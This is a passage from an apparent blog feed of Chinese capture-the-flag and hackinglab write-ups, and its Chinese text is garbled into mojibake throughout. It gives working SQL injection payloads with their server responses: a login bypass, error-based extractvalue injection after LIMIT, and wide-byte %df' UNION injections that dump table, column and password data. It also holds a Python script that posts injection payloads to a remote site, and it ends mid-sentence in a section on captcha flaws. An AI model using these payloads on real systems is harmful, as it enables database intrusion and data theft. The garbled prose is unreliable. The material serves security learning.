class="comment">#&#x27;&#x27;&#x27;(select/**/flag/**/from/**/fla9_14_h3r3),1,1,1#&#x27;&#x27;&#x27;&#125;</span></span><br><span class="line">    r=requests.post(<span class="string">&quot;http://mitah.cn:20000/charming_girls/?fun=show&amp;id=1&quot;</span>,data=payload)</span><br><span class="line">    r.encoding=r.apparent_encoding</span><br><span class="line">    temp=re.findall(<span class="string">r&quot;&lt;h2&gt;&lt;small&gt; å§“å:([^&lt;]+)&lt;/h2&gt;&quot;</span>,r.text)</span><br><span class="line">    <span class="built_in">print</span>(temp)</span><br><span class="line">    <span class="comment">#print(r.text)</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ‰‹é€Ÿä¸å­˜åœ¨çš„">11.æ‰‹é€Ÿ?ä¸å­˜åœ¨çš„</h3><p>çœŸçš„æ˜¯è·‘ä¸å‡ºflag,ocrè·‘åˆ°äº†30ä½éªŒè¯ç ç„¶åæŒ‚äº†,æ­»åœ¨ç¬¬5å…³</p><h3 id="å¿ƒç†æµ‹è¯•">12.å¿ƒç†æµ‹è¯•</h3><p>é¦–å…ˆ <img src="/images/2017/10/12.png" /> çŒœæµ‹åç¼€æ˜¯.ws,å°è¯•ä¸€ä¸‹ https://xn--g28hlb.ws/ å³ä¸¤ä¸ªè¡¨æƒ…è¿èµ·æ¥,åé¢åŠ .ws è¿›å…¥å¿ƒç†æµ‹è¯•é¡µé¢ <img src="/images/2017/10/13.png" /> è¦åˆ†æ•°ç›¸åŒ,é‚£å°±å…ˆè·å–ä¸‹åˆ†æ•°åˆ—è¡¨,è¿™é‡Œå°±ä¸å†™äº†,è‡ªå·±å»ç®— è·å–ä¹‹å,å†™ä¸€ä¸ªéå†åˆ†æ•°çš„è„šæœ¬(å¹¶ä¸å¤æ‚) ç„¶åæ‰¾ä¸€ä¸‹å¾ˆå®¹æ˜“æ‰¾åˆ°äº†æœ‰ä¸€ä¸ªè¿”å›ä¸‹é¢æœ‰ä¸ªd0_y0u_11ke_me.php è¯·æ±‚ä¸€ä¸‹ <img src="/images/2017/10/14.png" /> å‘ç°æ˜¯æ®µæºç å®¡è®¡...å¤§æ¦‚çœ‹äº†ä¸‹,å‰é¢éƒ½å¥½è¿‡çš„... https://xn--g28hlb.ws/d0_y0u_11ke_me.php?a[]=123&amp;b[]=123.0 åˆ—è¡¨ç»•md5,æ•°å­—å¼±ç±»å‹ç­‰,å¼ºç±»å‹ä¸ç­‰,ç„¶åæ­»åœ¨äº†shellçš„å¯†ç ä¸Šé¢,è¿™é‡Œæˆ‘å†whoisä¸Šé¢æ‰¾åˆ°äº†ä¸€äº›ä¿¡æ¯,æ¯”å¦‚ <img src="/images/2017/10/15.png" /> ç„¶åæ‰¾ç¤¾å·¥åº“,å¤±è´¥äº†,ç„¶åæ‹›æ–°å°±ç»“æŸäº†</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hackinglabè¡¥å……å­¦ä¹ (æ³¨å…¥å…³)</title>
      <link href="/2017/09/16/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E6%B3%A8%E5%85%A5%E5%85%B3/"/>
      <url>/2017/09/16/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E6%B3%A8%E5%85%A5%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h5 id="ç¬¬ä¸€å…³æœ€ç®€å•çš„sqlæ³¨å…¥">ç¬¬ä¸€å…³:æœ€ç®€å•çš„SQLæ³¨å…¥</h5><p>Tipsé¢˜ç›®é‡Œæœ‰ç®€å•æç¤º <a href="http://lab1.xseclab.com/sqli2_3265b4852c13383560327d1c31550b60/index.php">é€šå…³åœ°å€</a> å¾ˆç®€å• å¸å·:admin'or'1'='1 å¯†ç éšä¾¿ ç¬¬äºŒé¢˜ç¬¬ä¸‰é¢˜ç‚¸äº†,æ‰“ä¸å¼€ ç¬¬å››é¢˜limitæ³¨å…¥ ##### ç¬¬å››å…³:åˆ°åº•èƒ½ä¸èƒ½å›æ˜¾</p><p>å°æ˜ç»è¿‡å­¦ä¹ ï¼Œç»ˆäºå¯¹SQLæ³¨å…¥æœ‰äº†ç†è§£ï¼Œå¥¹çŸ¥é“åŸæ¥sqlæ³¨å…¥çš„å‘ç”Ÿæ ¹æœ¬åŸå› è¿˜æ˜¯æ•°æ®å’Œè¯­å¥ä¸èƒ½æ­£ç¡®åˆ†ç¦»çš„åŸå› ï¼Œå¯¼è‡´æ•°æ®ä½œä¸ºsqlè¯­å¥æ‰§è¡Œï¼›ä½†æ˜¯æ˜¯ä¸æ˜¯åªè¦èƒ½å¤Ÿæ§åˆ¶sqlè¯­å¥çš„ä¸€éƒ¨åˆ†å°±èƒ½å¤Ÿæ¥åˆ©ç”¨è·å–æ•°æ®å‘¢ï¼Ÿå°æ˜ç»è¿‡æ€è€ƒçŸ¥é“ï¼Œwhereæ¡ä»¶å¯æ§çš„æƒ…å†µä¸‹ï¼Œå®åœ¨æ˜¯å¤ªå®¹æ˜“äº†ï¼Œä½†æ˜¯å¦‚æœæ˜¯åœ¨limitæ¡ä»¶å‘¢ï¼Ÿ <a href="http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1">é€šå…³åœ°å€</a></p><p>è¿™é“é¢˜æˆ‘æ˜¯å»çœ‹çš„wpçš„,è‡ªå·±ä¸ä¼šå†™. é¦–å…ˆæµ‹è¯•çš„æ—¶å€™å‘ç°startå‚æ•°å¯ä»¥æ³¨å…¥è€Œnumä¸å¯æ³¨å…¥,ç„¶ålimitåé¢å…¶å®è¿˜å¯ä»¥æ¥procedure analyseè¯­å¥æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥,æ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨extractvalue,ç„¶åxpathæˆ‘ä»¬å†™ä¸€ä¸ªsqlè¯­å¥,é‚£ä¹ˆå°±ä¼šæŠ¥é”™,ä½†æ˜¯åˆç”±äºsqlè¯­å¥å¾—åˆ°äº†æ‰§è¡Œ,æ‰€ä»¥æˆ‘ä»¬å°±å¾—åˆ°äº†æ•°æ®åº“çš„ä¿¡æ¯</p><p>é¦–å…ˆæˆ‘ä»¬å†™ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select group\_concat(table\_name) from information\_schema.tables where table\_schema=database()))),1)--+&amp;num=1 </span><br></pre></td></tr></table></figure></p><p>ç„¶åæŠ¥é”™ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;:article,user&#x27; Warning: mysql\_fetch\_row() expects parameter 1 to be resource, boolean given in sqli5\_5ba0bba6a6d1b30b956843f757889552/index.php on line 51</span><br></pre></td></tr></table></figure></p><p>äºæ˜¯æˆ‘ä»¬çŸ¥é“äº†æœ‰articleå’Œuserä¸¤ä¸ªè¡¨,ç„¶åçˆ†åˆ— <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select group\_concat(column\_name) from information\_schema.columns where table\_name=0x75736572))),1)--+&amp;num=1</span><br></pre></td></tr></table></figure> è¿”å›äº† <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;:id,username,password,lastloginI&#x27; Warning: mysql\_fetch\_row() expects parameter 1 to be resource, boolean given in sqli5\_5ba0bba6a6d1b30b956843f757889552/index.php on line 51 </span><br></pre></td></tr></table></figure></p><p>ç„¶åæˆ‘ä»¬å»passwordé‡Œé¢,åœ¨limit 2,1çš„æ—¶å€™å¾—åˆ°flag <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?start=0 procedure analyse(extractvalue(rand(),concat(0x3a,(select password from user limit 2,1))),1)--+&amp;num=1 è¿”å›å€¼ä¸º: XPATH syntax error: &#x27;:myflagishere&#x27; Warning: mysql\_fetch\_row() expects parameter 1 to be resource, boolean given in sqli5\_5ba0bba6a6d1b30b956843f757889552/index.php on line 51</span><br></pre></td></tr></table></figure></p><h5 id="ç¬¬äº”å…³é‚‚é€…">ç¬¬äº”å…³:é‚‚é€…</h5><p>å°æ˜ä»Šå¤©å‡ºé—¨çœ‹è§äº†ä¸€ä¸ªæ¼‚äº®çš„å¸…å“¥å’Œæ¼‚äº®çš„ç¾å¥³ï¼Œäºæ˜¯ä»–å†™åˆ°äº†ä»–çš„æ—¥è®°æœ¬é‡Œã€‚</p><p><a href="http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/">é€šå…³åœ°å€</a></p><p>çœ‹çš„wp,ç¬¬ä¸€æ¬¡è§åˆ°è¿™ç§æ³¨å…¥æ–¹æ³•.</p><p>é¦–å…ˆæºç é‡Œé¢æœ‰ä¸ª<a href="http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1.jpg">é“¾æ¥</a></p><p>æ³¨å…¥ç‚¹åœ¨å“ªå‘¢?åœ¨å›¾ç‰‡åå­—é‚£é‡Œå­˜åœ¨æ³¨å…¥ç‚¹,æˆ‘ä»¬è®¿é—®:http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'.jpg</p><p>è·å¾—æŠ¥é”™ä¿¡æ¯: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '.jpg'' at line 1<br /><strong>Warning</strong>: mysql_fetch_row() expects parameter 1 to be resource, boolean given in <strong>sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/myimages1.php</strong> on line <strong>18</strong></p><p>å³å­˜åœ¨æ³¨å…¥,ç„¶åæˆ‘ä»¬orderbyæŸ¥å‡ºåˆ—æ•°: å¾—åˆ°ç»“æœçš„ä¸¤æ¬¡æŸ¥è¯¢</p><p>http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'order by 4--+.jpg æ²¡æœ‰è¿”å› http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'order by 5--+.jpg å¾—åˆ°è¿”å›: Unknown column '5' in 'order clause'<br /><strong>Warning</strong>: mysql_fetch_row() expects parameter 1 to be resource, boolean given in <strong>sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/myimages1.php</strong> on line <strong>18</strong></p><p>ç„¶åç”¨unionæå–å°±okäº†: å…ˆç”¨1,2,3,4æ‰¾è¾“å‡º: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,3,4--+.jpg è¿”å›çš„æ˜¯3</p><p>æ‰€ä»¥æˆ‘ä»¬ç»§ç»­æ„é€ : http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4--+.jpg</p><p>å¾—åˆ°è¿”å›:article,pic</p><p>ç„¶åæˆ‘ä»¬åˆ†åˆ«çˆ†å‡ºä¸¤ä¸ªè¡¨ä¸­çš„åˆ—,å…ˆæŠ¥article: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x61727469636c65),4--+.jpg</p><p>è·å¾—è¿”å›:id,title,content,others</p><p>ç„¶ååŒç†çˆ†pic: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x61727469636c65),4--+.jpg</p><p>è·å¾—è¿”å›:id,picname,data,text</p><p>ç„¶åçˆ†æ‰articleçš„æ‰€æœ‰åˆ—,æ²¡æœ‰æ‰¾åˆ°flagç›¸å…³ä¿¡æ¯</p><p>http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(è¦å°è¯•çš„åˆ—) from article),4--+.jpg</p><p>ç„¶åæˆ‘ä»¬åœ¨picé‡Œé¢çˆ†çš„æ—¶å€™: http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df' union select 1,2,(select group_concat(picname) from pic),4--+.jpg</p><p>è·å¾—è¿”å›:dog1.jpg,cat1.jpg,flagishere_askldjfklasjdfl.jpg</p><p>å‘ç°åå­—é‡Œé¢æœ‰ä¸€ä¸ªflagishere_askldjfklasjdfl.jpg,è¿™ä¸ªæ—¶å€™ç›´æ¥è®¿é—®http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/flagishere_askldjfklasjdfl.jpgå°±okäº†</p><p>è€Œä¸”ä¹Ÿå¯ä»¥è®¿é—® http://lab1.xseclab.com/sqli6_f37a4a60a4a234cd309ce48ce45b9b00/images/dog1%df'%20union%20select%201,2,(select data from pic limit 0,1),4--+.jpg</p><p>å¤§æ¦‚æ˜¯é€šè¿‡picnameå–dataé‡Œé¢çš„å›¾ç‰‡çš„äºŒè¿›åˆ¶ç„¶åç”Ÿæˆå›¾ç‰‡,æ‰€ä»¥æˆ‘ä»¬æ‰èƒ½åœ¨picnameé‚£é‡Œæ³¨å…¥?</p>]]></content>
      
      
      <categories>
          
          <category> webç¯‡ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hackinglabè¡¥å……å­¦ä¹ (è„šæœ¬å…³)</title>
      <link href="/2017/08/28/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E8%84%9A%E6%9C%AC%E5%85%B3/"/>
      <url>/2017/08/28/hackinglab%E8%A1%A5%E5%85%85%E5%AD%A6%E4%B9%A0%E8%84%9A%E6%9C%AC%E5%85%B3/</url>
      
        <content type="html"><![CDATA[<h5 id="ç¬¬ä¸€å…³keyåˆåˆæ‰¾ä¸åˆ°äº†">ç¬¬ä¸€å…³:keyåˆåˆæ‰¾ä¸åˆ°äº†</h5><p>å°æ˜è¿™æ¬¡å“­äº†ï¼Œkeyåˆæ‰¾ä¸åˆ°äº†ï¼ï¼ï¼ keyå•Šï¼Œä½ ç©¶ç«Ÿè—åˆ°äº†å“ªé‡Œï¼Œä¸ºä»€ä¹ˆæˆ‘çœ‹åˆ°çš„é¡µé¢ä¸Šéƒ½æ²¡æœ‰å•Šï¼ï¼ï¼ï¼ï¼ï¼ <a href="http://lab1.xseclab.com/xss1_30ac8668cd453e7e387c76b132b140bb/index.php">é€šå…³åœ°å€</a> æŠ“åŒ…ç›´æ¥è¿‡</p><h5 id="ç¬¬äºŒå…³å¿«é€Ÿå£ç®—">ç¬¬äºŒå…³:å¿«é€Ÿå£ç®—</h5><p>å°æ˜è¦å‚åŠ ä¸€ä¸ªé«˜æŠ€èƒ½æ¯”èµ›ï¼Œè¦æ±‚æ¯ä¸ªäººéƒ½è¦èƒ½å¤Ÿå¿«é€Ÿå£ç®—å››åˆ™è¿ç®—ï¼Œ2ç§’é’Ÿä¹‹å†…å°±èƒ½å¤Ÿå¾—åˆ°ç»“æœï¼Œä½†æ˜¯å°æ˜å°±æ˜¯ä¸€ä¸ªå°å­¦ç”Ÿæ²¡æœ‰ç»è¿‡ç‰¹æ®Šçš„åŸ¹è®­ï¼Œé‚£å°æ˜èƒ½å¦é€šè¿‡å¿«é€Ÿå£ç®—æµ‹éªŒå‘¢ï¼Ÿ <a href="http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php">é€šå…³åœ°å€</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">u=requests.session()</span><br><span class="line"><span class="built_in">print</span>(u.post(<span class="string">&#x27;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&#x27;</span>,data=&#123;<span class="string">&#x27;v&#x27;</span>:<span class="built_in">eval</span>(<span class="built_in">str</span>(re.findall(<span class="string">r&#x27;</span></span><br><span class="line"><span class="string">\n            ([^=]+)=&#x27;</span>,u.get(<span class="string">&#x27;http://lab1.xseclab.com/xss2_0d557e6d2a4ac08b749b61473a075be1/index.php&#x27;</span>).text)[<span class="number">0</span>]))&#125;).text)</span><br></pre></td></tr></table></figure><h5 id="ç¬¬ä¸‰å…³è¿™ä¸ªé¢˜ç›®æ˜¯ç©ºçš„">ç¬¬ä¸‰å…³:è¿™ä¸ªé¢˜ç›®æ˜¯ç©ºçš„</h5><p>Tips:è¿™ä¸ªé¢˜ç›®çœŸä¸æ˜¯éšä¾¿è®¾ç½®çš„ã€‚ ä»€ä¹ˆæ‰æ˜¯ç©ºçš„å‘¢ï¼Ÿ é€šå…³åœ°å€ï¼šæ²¡æœ‰ï¼Œè¯·ç›´æ¥æäº¤ç­”æ¡ˆ(å°å†™å³å¯) ä¸€è„¸æ‡µé€¼ç„¶åå»ç™¾åº¦,ç„¶åæ‰çŸ¥é“ç­”æ¡ˆæ˜¯null....æ˜¯åœ¨ä¸‹è¾“äº†...</p><h5 id="ç¬¬å››å…³æ€ä¹ˆå°±æ˜¯ä¸å¼¹å‡ºkeyå‘¢">ç¬¬å››å…³:æ€ä¹ˆå°±æ˜¯ä¸å¼¹å‡ºkeyå‘¢ï¼Ÿ</h5><p>æäº¤è¯´æ˜ï¼šæäº¤å‰14ä¸ªå­—ç¬¦å³å¯è¿‡å…³ <a href="http://lab1.xseclab.com/xss3_5dcdde90bbe55087eb3514405972b1a6/index.php">é€šå…³åœ°å€</a> è¿™ç§jsæˆ‘ä¸€ç›´ä¸çŸ¥é“æ€ä¹ˆæ,åæ¥çŒœçŸ¥é“è¿™ä¸ªä¸œè¥¿å«åŒ¿åå‡½æ•°,ç›´æ¥æ‰§è¡Œä¹Ÿæ˜¯æœ‰ä¸€äº›æ–¹æ³•çš„,ç™¾åº¦ä¸€ä¸‹ä½ å°±çŸ¥é“,æ¯”å¦‚å‰é¢å¯ä»¥åŠ ä¸Š~,-,+ä»€ä¹ˆçš„,æˆ–è€…åé¢åŠ ä¸Šä¸€ä¸ªæ‹¬å·,ä½†æ˜¯åˆè¦ä¿è¯æ˜¯è¡¨è¾¾å¼æ‰€ä»¥å‰é¢åŠ ä¸Šä¸€ä¸ª! æ¯”å¦‚è¿™é“é¢˜æˆ‘ä»¬å°±å¯ä»¥</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">!<span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">               <span class="keyword">var</span> b=<span class="keyword">function</span>(<span class="params">p,a,c,k,e,r</span>)&#123;e=<span class="keyword">function</span>(<span class="params">c</span>)&#123;<span class="keyword">return</span>(c&lt;a?<span class="string">&#x27;&#x27;</span>:<span class="title function_">e</span>(<span class="built_in">parseInt</span>(c/a)))+((c=c%a)&gt;<span class="number">35</span>?<span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(c+<span class="number">29</span>):c.<span class="title function_">toString</span>(<span class="number">36</span>))&#125;;<span class="keyword">if</span>(!<span class="string">&#x27;&#x27;</span>.<span class="title function_">replace</span>(<span class="regexp">/^/</span>,<span class="title class_">String</span>))&#123;<span class="keyword">while</span>(c--)r[<span class="title function_">e</span>(c)]=k[c]<span class="title function_">e</span>(c);k=[<span class="keyword">function</span>(<span class="params">e</span>)&#123;<span class="keyword">return</span> r[e]&#125;];e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">return</span><span class="string">&#x27;\\w+&#x27;</span>&#125;;c=<span class="number">1</span>&#125;;<span class="keyword">while</span>(c--)<span class="keyword">if</span>(k[c])p=p.<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="string">&#x27;\\b&#x27;</span>+<span class="title function_">e</span>(c)+<span class="string">&#x27;\\b&#x27;</span>,<span class="string">&#x27;g&#x27;</span>),k[c]);<span class="keyword">return</span> p&#125;(<span class="string">&#x27;1s(1e(p,a,c,k,e,r)&#123;e=1e(c)&#123;1d(c&lt;a?\&#x27;\&#x27;:e(1p(c/a)))+((c=c%a)&gt;1q?1f.1j(c+1k):c.1n(1o))&#125;;1g(!\&#x27;\&#x27;.1h(/^/,1f))&#123;1i(c--)r[e(c)]=k[c]e(c);k=[1e(e)&#123;1d r[e]&#125;];e=1e()&#123;1d\&#x27;\\\\w+\&#x27;&#125;;c=1&#125;;1i(c--)1g(k[c])p=p.1h(1l 1m(\&#x27;\\\\b\&#x27;+e(c)+\&#x27;\\\\b\&#x27;,\&#x27;g\&#x27;),k[c]);1d p&#125;(\&#x27;Y(R(p,a,c,k,e,r)&#123;e=R(c)&#123;S(c&lt;a?\\\&#x27;\\\&#x27;:e(18(c/a)))+((c=c%a)&gt;17?T.16(c+15):c.12(13))&#125;;U(!\\\&#x27;\\\&#x27;.V(/^/,T))&#123;W(c--)r[e(c)]=k[c]e(c);k=[R(e)&#123;S r[e]&#125;];e=R()&#123;S\\\&#x27;\\\\\\\\w+\\\&#x27;&#125;;c=1&#125;;W(c--)U(k[c])p=p.V(Z 11(\\\&#x27;\\\\\\\\b\\\&#x27;+e(c)+\\\&#x27;\\\\\\\\b\\\&#x27;,\\\&#x27;g\\\&#x27;),k[c]);S p&#125;(\\\&#x27;G(B(p,a,c,k,e,r)&#123;e=B(c)&#123;A c.L(a)&#125;;E(!\\\\\\\&#x27;\\\\\\\&#x27;.C(/^/,F))&#123;D(c--)r[e(c)]=k[c]e(c);k=[B(e)&#123;A r[e]&#125;];e=B()&#123;A\\\\\\\&#x27;\\\\\\\\\\\\\\\\w+\\\\\\\&#x27;&#125;;c=1&#125;;D(c--)E(k[c])p=p.C(I J(\\\\\\\&#x27;\\\\\\\\\\\\\\\\b\\\\\\\&#x27;+e(c)+\\\\\\\&#x27;\\\\\\\\\\\\\\\\b\\\\\\\&#x27;,\\\\\\\&#x27;g\\\\\\\&#x27;),k[c]);A p&#125;(\\\\\\\&#x27;t(h(p,a,c,k,e,r)&#123;e=o;n(!\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\&#x27;.m(/^/,o))&#123;l(c--)r[c]=k[c]c;k=[h(e)&#123;f r[e]&#125;];e=h()&#123;f\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\w+\\\\\\\\\\\\\\\&#x27;&#125;;c=1&#125;;l(c--)n(k[c])p=p.m(q s(\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\&#x27;+e(c)+\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\b\\\\\\\\\\\\\\\&#x27;,\\\\\\\\\\\\\\\&#x27;g\\\\\\\\\\\\\\\&#x27;),k[c]);f p&#125;(\\\\\\\\\\\\\\\&#x27;1 3=&quot;6&quot;;1 4=&quot;7&quot;;1 5=&quot;&quot;;8(1 2=0;2&lt;9;2++)&#123;5+=3+4&#125;\\\\\\\\\\\\\\\&#x27;,j,j,\\\\\\\\\\\\\\\&#x27;uibcdvxyj\\\\\\\\\\\\\\\&#x27;.z(\\\\\\\\\\\\\\\&#x27;\\\\\\\\\\\\\\\&#x27;),0,&#123;&#125;))\\\\\\\&#x27;,H,H,\\\\\\\&#x27;ABMDCEFIJGNOPQK\\\\\\\&#x27;.K(\\\\\\\&#x27;\\\\\\\&#x27;),0,&#123;&#125;))\\\&#x27;,X,X,\\\&#x27;SRVWUTY13Z11141210191a1b1c\\\&#x27;.14(\\\&#x27;\\\&#x27;),0,&#123;&#125;))\&#x27;,1t,1u,\&#x27;1e1d1f1g1h1i1v1s1l1m1n1o1r1k1j1q1p1w1x1y1z\&#x27;.1r(\&#x27;\&#x27;),0,&#123;&#125;))&#x27;</span>,<span class="number">62</span>,<span class="number">98</span>,<span class="string">&#x27;returnfunctionStringifreplacewhilefromCharCode29newRegExptoString36parseInt35spliteval627553varslakfjteslkjsdflkfor&#x27;</span>.<span class="title function_">split</span>(<span class="string">&#x27;&#x27;</span>),<span class="number">0</span>,&#123;&#125;);</span><br><span class="line">               <span class="keyword">var</span> d=<span class="built_in">eval</span>(b);</span><br><span class="line">               <span class="title function_">alert</span>(<span class="string">&quot;key is first 14 chars &quot;</span>+d.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">14</span>));</span><br><span class="line">            &#125;()</span><br></pre></td></tr></table></figure><p>å¾€æ§åˆ¶å°ä¸€æ‰”å°±å¯ä»¥äº†</p><h4 id="éªŒè¯ç ç³»åˆ—">éªŒè¯ç ç³»åˆ—</h4><p>é€šè¿‡ç™¾åº¦äº†è§£äº†ä¸€æ³¢ è®¾ç½®ä»¥åŠéªŒè¯éªŒè¯ç çš„æµç¨‹(è‡ªå·±çš„ç†è§£...): 1.å†™ä¸€ä¸ªvcode.php,ç¨‹åºé‡Œé¢å®ç°ä¸€ä¸ªç”ŸæˆéªŒè¯ç çš„ç¨‹åºç„¶åæŠŠéªŒè¯ç åŠ å¯†(hash)æ”¾è¿›sessionæˆ–cookie(è™½ç„¶æˆ‘è§‰å¾—æ”¾åœ¨sessioné‡Œé¢ä¼šå®‰å…¨ä¸€äº›...) 2.åœ¨ç™»å½•é¡µé¢æ˜¾ç¤ºéªŒè¯ç ä»¥åŠè¡¨å•ç­‰å¾…ç”¨æˆ·è¾“å…¥ 3.åœ¨éªŒè¯é¡µé¢æŠŠç”¨æˆ·è¾“å…¥çš„å€¼è¿›è¡ŒåŠ å¯†(hash)ç„¶åå’Œsessionå€¼æˆ–cookieå€¼å¯¹æ¯”,ç›¸ç­‰çš„è¯å°±éªŒè¯æˆåŠŸ,å¦åˆ™å¤±è´¥(æŒ‡çš„åªæ˜¯éªŒè¯ç ). å½“ç„¶,å¦‚æœè®¾ç½®ä¸å½“è¿™é‡Œä¹Ÿå­˜åœ¨ä¸€äº›æ¼æ´ æ¯”å¦‚</p><h6 id="éªŒè¯ç ä»…é€šè¿‡cookieéªŒè¯">1.éªŒè¯ç ä»…é€šè¿‡cookieéªŒè¯</h6><p>å¦‚æœä½ æŠŠéªŒè¯ç åŠ å¯†ç„¶ååªæ”¾åœ¨cookieé‡Œé¢,é‚£ä¹ˆhackerå¯ä»¥é€šè¿‡æ§åˆ¶cookieæ¥æ§åˆ¶éªŒè¯ç çš„ç­”æ¡ˆ æ¯”å¦‚ä½ éªŒè¯ç 1234,cookieç”¨md5(1234),ç„¶åéªŒè¯çš„æ—¶å€™æ˜¯åˆ¤æ–­if(md5(<span class="math inline">\(\_POST\[&quot;vcode&quot;\])==\)</span>_COOKIE["xxx"]{ä¸€é¡¿æ“ä½œ},é‚£ä¹ˆç”¨æˆ·å¯ä»¥é€šè¿‡æŠŠcookie["xxx"]è®¾ç½®æˆmd5(1234),ç„¶åéªŒè¯ç è®¾ç½®ä¸º1234,é‚£ä¹ˆè¿™ä¸ªåˆ¤æ–­å°±æ°¸è¿œæ˜¯æ­£ç¡®çš„(å½“ç„¶å®¢æˆ·ç«¯ä¸éœ€è¦çŸ¥é“ä½ æ˜¯ä¸æ˜¯md5,ä»–åªéœ€è¦çŸ¥é“å½“ç»‘å®šcookieä¹‹åå‘é€ç›¸åŒéªŒè¯ç èƒ½ä¸èƒ½é€šè¿‡éªŒè¯å°±å¥½äº†)</p><h6 id="ä¸è¿›è¡Œéç©ºåˆ¤æ–­">2.ä¸è¿›è¡Œéç©ºåˆ¤æ–­</h6><p>å¦‚æœä½ åœ¨vcode.phpé‡Œé¢è®¾ç½®äº†<span class="math inline">\(\_SESSION\[&quot;vcode&quot;\],ç„¶åæƒ³é€šè¿‡è¿™ä¸ªæ¥åˆ¤æ–­ç”¨æˆ·çš„è¾“å…¥,ä½†æ˜¯åˆæ²¡æœ‰å¯¹å˜é‡è¿›è¡Œéç©ºåˆ¤æ–­,é‚£ä¹ˆç”¨æˆ·å¯ä»¥ç›´æ¥postä½ çš„éªŒè¯é¡µé¢è€Œä¸å»è®¿é—®ä½ çš„è¡¨å•é¡µé¢,é‚£ä¹ˆè¿™ä¸ªæ—¶å€™ä½ çš„sessionè¿˜æ²¡æœ‰è®¾ç½®,æ‰€ä»¥ä¸ºç©º,ç„¶åç”¨æˆ·postä¸€ä¸ªç©ºå€¼è¿‡æ¥é‚£ä¹ˆéªŒè¯å°±é€šè¿‡äº†.è¿™ä¸ªæ—¶å€™å¯ä»¥åœ¨åˆ¤æ–­çš„å‰é¢è®¾ç½®ä¸€ä¸ªisset(\)</span>_SESSION["xxx"])æ¥åˆ¤æ–­,å½“ç„¶,æœ€åè¿˜è¦è®°ä½æŠŠsessionå€¼æ¸…æ‰,å¦åˆ™å°±ä¼šæœ‰ä¸‹é¢è¿™ä¸ªæ¼æ´</p><h6 id="æ²¡æœ‰è¿›è¡ŒéªŒè¯ç çš„é”€æ¯">3.æ²¡æœ‰è¿›è¡ŒéªŒè¯ç çš„é”€æ¯</h6><p>å¦‚æœä½ 